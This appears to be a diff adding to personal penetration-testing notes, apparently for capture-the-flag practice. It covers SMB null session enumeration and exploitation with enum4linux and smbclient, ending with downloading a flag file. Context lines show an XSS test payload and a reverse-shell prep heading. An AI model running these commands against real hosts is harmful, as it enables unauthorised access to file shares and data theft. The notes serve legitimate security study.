@@ -21,6 +21,24 @@
 - Test for XSS 
 `<script>alert(1)</script>` (Returns pop up window) 
 
+# Null Session Attacks
+
+- Check for null session
+`enum4linux -n <target IP>`
+- If there is a vulnerability, should see that File Server Service is active and the <20> appear in the list.
+
+## Exploit null session
+
+- Gather info
+`enum4linux -a <target IP>`
+- Use smbclient to navigate the target machine 
+`smbclient -L WORKGROUP -I <target IP> -N -U ""`
+- Access shares 
+`smbclient \\\\<target IP>\\<share name> -N`
+- SMB navigation + downloading flag to Kali
+`get Congratulations.txt /root/Desktop/Congratulations.txt`
+
+
 # Prep for Reverse Shell 
 
 ## msfvenom 
